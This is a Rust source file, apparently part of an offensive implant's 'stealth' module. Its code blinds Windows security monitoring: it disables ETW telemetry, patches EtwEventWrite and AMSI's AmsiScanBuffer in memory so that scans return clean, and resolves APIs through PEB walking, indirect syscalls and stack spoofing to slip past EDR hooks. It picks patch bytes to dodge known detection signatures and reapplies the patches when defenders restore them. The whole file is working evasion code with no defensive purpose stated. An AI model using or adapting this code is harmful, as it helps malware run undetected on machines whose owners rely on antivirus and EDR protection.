// Client/core/src/stealth/integrity.rs
// EDR Blinding: ETW and AMSI Patching via PEB Walk + Indirect Syscalls
//
// Technique 1: ETW Disable via NtSetInformationProcess (ProcessTraceFlags = 1)
// Technique 2: AMSI Bypass via AmsiScanBuffer patch (non-classic signature)
//
// All API resolution via PEB Walking to bypass user-land hooks.
// Memory protect: PAGE_READWRITE for write, then restore original (never leave RWX).

/// Process information class for ETW disable
const PROCESS_TRACE_FLAGS: u32 = 0x1E;

/// ETW disable flag value
const PROCESS_TRACE_FLAG_DISABLE: u32 = 1;

/// PAGE_READWRITE — write patch without EXECUTE+WRITE combined
const PAGE_READWRITE: u32 = 0x04;

/// Stored last patch sites for verify_patches (addr, expected bytes)
#[cfg(windows)]
static PATCH_SITES: std::sync::Mutex<Vec<(usize, Vec<u8>)>> = std::sync::Mutex::new(Vec::new());

/// Patch ETW (Event Tracing for Windows) to blind EDR/AV telemetry.
///
/// Method: NtSetInformationProcess(ProcessTraceFlags, 1)
/// This disables ETW telemetry at the process level without patching EtwEventWrite.
/// Much cleaner than memory patching and less fingerprinted.
#[cfg(windows)]
pub fn patch_etw() {
    crate::stealth::stack::with_spoofed_stack(|| unsafe {
        // Prefer indirect syscall for NtSetInformationProcess (avoids hooked ntdll stub).
        let trace_flags: u32 = PROCESS_TRACE_FLAG_DISABLE;
        let status = crate::syscall_nt!(
            b"NtSetInformationProcess",
            !0usize, // NtCurrentProcess (-1) — x86/x64
            PROCESS_TRACE_FLAGS,
            &trace_flags as *const u32,
            4u32, // sizeof(u32)
        );

        if status < 0 {
            // Fallback: Try alternative ETW patch via EtwEventWrite memory patch
            patch_etw_fallback();
        }
    })
}

/// Fallback ETW patch: Direct memory patching of ntdll!EtwEventWrite
/// Only used if NtSetInformationProcess fails (e.g., on older Windows versions)
///
/// Avoids classic `xor eax,eax; ret` (31 C0 C3). Uses single-byte `ret` (C3).
#[cfg(windows)]
unsafe fn patch_etw_fallback() {
    let ntdll_base =
        crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 {
        return;
    }

    let etw_write_hash = crate::stealth::hash_api_name(b"EtwEventWrite");
    let etw_write_addr = crate::stealth::get_api_addr(ntdll_base, etw_write_hash);

    if let Some(addr) = etw_write_addr {
        // Single-byte ret — not the high-signature 31 C0 C3 triad
        let patch_bytes: [u8; 1] = [0xC3];
        apply_code_patch(addr, &patch_bytes);
    }
}

/// Patch AMSI (Anti-Malware Scan Interface) to bypass memory scanning.
///
/// Method: Patch amsi.dll!AmsiScanBuffer to return 0 (S_OK / clean path).
/// Uses `mov eax, 0; ret` (B8 00 00 00 00 C3) instead of classic `xor eax,eax; ret`.
#[cfg(windows)]
pub fn patch_amsi() {
    crate::stealth::stack::with_spoofed_stack(|| unsafe {
        // 1. Only patch if amsi.dll already loaded (do not force-load).
        let amsi_base =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"amsi.dll"));
        if amsi_base == 0 {
            return;
        }

        let amsi_scan_hash = crate::stealth::hash_api_name(b"AmsiScanBuffer");
        let amsi_scan_addr = crate::stealth::get_api_addr(amsi_base, amsi_scan_hash);

        if let Some(addr) = amsi_scan_addr {
            #[cfg(target_arch = "x86_64")]
            let patch_bytes: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3]; // mov eax,0; ret

            #[cfg(target_arch = "x86")]
            let patch_bytes: [u8; 3] = [0xC2, 0x18, 0x00]; // ret 0x18

            if !apply_code_patch(addr, &patch_bytes) {
                #[cfg(feature = "stealth-adv")]
                patch_amsi_syscall(addr, &patch_bytes);
            }
        }
    })
}

/// Write patch with PAGE_READWRITE then restore original protect (never RWX 0x40).
#[cfg(windows)]
unsafe fn apply_code_patch(addr: usize, patch: &[u8]) -> bool {
    let old_protect = change_memory_protection(addr, patch.len(), PAGE_READWRITE);
    if old_protect == 0 {
        return false;
    }
    std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());
    // Prefer restoring original; if original was unexpected, fall back to RX
    let restore = if old_protect == PAGE_READWRITE || old_protect == 0x40 {
        0x20 // PAGE_EXECUTE_READ
    } else {
        old_protect
    };
    restore_memory_protection(addr, patch.len(), restore);
    if let Ok(mut sites) = PATCH_SITES.lock() {
        sites.push((addr, patch.to_vec()));
    }
    true
}

/// Alternative AMSI patch using indirect syscalls to bypass hook detection
#[cfg(all(windows, target_arch = "x86_64", feature = "stealth-adv"))]
unsafe fn patch_amsi_syscall(addr: usize, patch: &[u8]) {
    use crate::syscalls::indirect_syscall;

    // 1. NtProtectVirtualMemory → PAGE_READWRITE (not RWX)
    let mut base = addr;
    let mut size = patch.len();
    let mut old_protect: u32 = 0;

    let status_protect = indirect_syscall(
        crate::stealth::hash_api_name(b"NtProtectVirtualMemory"),
        &[
            0xFFFFFFFFFFFFFFFF, // CurrentProcess pseudo-handle
            &mut base as *mut _ as usize,
            &mut size as *mut _ as usize,
            PAGE_READWRITE as usize,
            &mut old_protect as *mut _ as usize,
        ],
    );

    if status_protect < 0 {
        return;
    }

    // 2. Write the patch
    std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());

    // 3. Restore original protection (never leave RWX)
    let restore = if old_protect == 0 || old_protect == 0x40 {
        0x20
    } else {
        old_protect
    };
    let mut restore_size = patch.len();
    let mut restore_protect: u32 = 0;
    base = addr;
    indirect_syscall(
        crate::stealth::hash_api_name(b"NtProtectVirtualMemory"),
        &[
            0xFFFFFFFFFFFFFFFF,
            &mut base as *mut _ as usize,
            &mut restore_size as *mut _ as usize,
            restore as usize,
            &mut restore_protect as *mut _ as usize,
        ],
    );

    if let Ok(mut sites) = PATCH_SITES.lock() {
        sites.push((addr, patch.to_vec()));
    }
}

#[cfg(all(windows, target_arch = "x86", feature = "stealth-adv"))]
unsafe fn patch_amsi_syscall(_addr: usize, _patch: &[u8]) {}

/// Change memory protection via NtProtectVirtualMemory (indirect syscall).
/// Returns previous protection, or 0 on failure.
#[cfg(windows)]
unsafe fn change_memory_protection(addr: usize, size: usize, new_protect: u32) -> u32 {
    let mut base = addr;
    let mut region_size = size;
    let mut old_protect: u32 = 0;
    let status = crate::syscall_nt!(
        b"NtProtectVirtualMemory",
        !0usize, // NtCurrentProcess (-1) — x86/x64
        &mut base as *mut usize,
        &mut region_size as *mut usize,
        new_protect,
        &mut old_protect as *mut u32,
    );
    if status >= 0 {
        old_protect
    } else {
        0
    }
}

/// Restore memory protection via NtProtectVirtualMemory.
#[cfg(windows)]
unsafe fn restore_memory_protection(addr: usize, size: usize, old_protect: u32) {
    let mut base = addr;
    let mut region_size = size;
    let mut dummy: u32 = 0;
    let _ = crate::syscall_nt!(
        b"NtProtectVirtualMemory",
        !0usize, // NtCurrentProcess (-1) — x86/x64
        &mut base as *mut usize,
        &mut region_size as *mut usize,
        old_protect,
        &mut dummy as *mut u32,
    );
}

// Non-Windows stubs
#[cfg(not(windows))]
pub fn patch_etw() {}

#[cfg(not(windows))]
pub fn patch_amsi() {}

/// Verify patches are still present; re-apply AMSI/ETW if stripped.
#[cfg(windows)]
pub fn verify_patches() -> bool {
    let sites = match PATCH_SITES.lock() {
        Ok(g) => g.clone(),
        Err(_) => return false,
    };
    if sites.is_empty() {
        return true;
    }
    let mut ok = true;
    for (addr, expected) in sites {
        if addr == 0 || expected.is_empty() {
            continue;
        }
        unsafe {
            let actual = std::slice::from_raw_parts(addr as *const u8, expected.len());
            if actual != expected.as_slice() {
                ok = false;
                break;
            }
        }
    }
    if !ok {
        // EDR may have restored original bytes — re-apply
        patch_etw();
        patch_amsi();
        return false;
    }
    true
}

#[cfg(not(windows))]
pub fn verify_patches() -> bool {
    true
}

/// Pure helper: preferred AMSI x64 patch bytes (not the classic 31 C0 C3).
#[cfg(test)]
pub fn amsi_x64_patch_bytes() -> &'static [u8] {
    &[0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn amsi_patch_is_not_classic_xor_ret() {
        let p = amsi_x64_patch_bytes();
        assert_ne!(p, &[0x31, 0xC0, 0xC3]);
        assert_eq!(p[0], 0xB8);
        assert_eq!(*p.last().unwrap(), 0xC3);
    }

    #[test]
    fn page_readwrite_not_rwx() {
        assert_eq!(PAGE_READWRITE, 0x04);
        assert_ne!(PAGE_READWRITE, 0x40);
    }
}
